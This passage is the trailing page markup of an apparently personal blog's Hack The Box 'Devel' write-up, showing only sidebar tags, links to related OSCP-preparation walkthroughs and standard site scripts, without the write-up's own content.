aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB: Devel - Nullprism&url=https://blog.nullprism.io//posts/htb-devel/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-devel/">HTB: Devel</a><li><a href="/posts/htb-legacy/">HTB: Legacy</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/oscp-prep/">oscp prep</a> <a class="post-tag" href="/tags/oscp-like/">oscp-like</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/nmap/">nmap</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-legacy/"><div class="card-body"> <span class="timeago small" >Aug 3<i class="unloaded">2021-08-03T22:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB: Legacy</h3><div class="text-muted small"><p> Intro So I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don’t have any reason not to. Community con...</p></div></div></a></div><div class="card"> <a href="/posts/htb-jerry/"><div class="card-body"> <span class="timeago small" >Aug 9<i class="unloaded">2021-08-09T15:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB: Jerry</h3><div class="text-muted small"><p> Intro I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don’t have any reason not to. Community consen...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blue/"><div class="card-body"> <span class="timeago small" >Aug 13<i class="unloaded">2021-08-13T16:36:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB: Blue</h3><div class="text-muted small"><p> Intro While ultimately not a challenging box - my frustrations were mostly with my own tooling. The python2/python3 split and slow deprecation of python2 has created huge amounts of annoyance. I t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-legacy/" class="btn btn-outline-primary" prompt="Older"><p>HTB: Legacy</p></a> <a href="/posts/htb-jerry/" class="btn btn-outline-primary" prompt="Newer"><p>HTB: Jerry</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/nullprism">Nullprism</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/oscp-prep/">oscp prep</a> <a class="post-tag" href="/tags/oscp-like/">oscp like</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/nmap/">nmap</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://blog.nullprism.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-E8EH9MYEVL"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-E8EH9MYEVL'); }); </script>
